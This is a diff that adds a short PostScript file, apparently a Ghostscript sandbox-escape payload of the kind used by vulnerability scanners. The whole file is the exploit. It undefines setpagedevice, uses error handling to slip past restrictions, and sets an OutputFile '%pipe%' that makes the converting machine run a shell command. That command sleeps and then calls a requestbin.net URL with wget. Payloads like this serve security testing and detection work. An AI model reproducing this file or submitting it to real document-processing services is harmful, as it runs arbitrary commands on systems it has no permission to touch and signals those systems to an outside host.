@@ -1,0 +1,9 @@
+%!PS
+userdict /setpagedevice undef
+a0
+currentpagedevice /HWResolution get 0 (RxarWNsUhb818Il7hROQ) put
+{ grestore } stopped pop
+(ppmraw) selectdevice
+mark /OutputFile (%pipe%sh -c '(sleep 4390|wget http://requestbin.net/r/10dgzxy1)') currentdevice putdeviceprops
+{ showpage } stopped pop
+quit
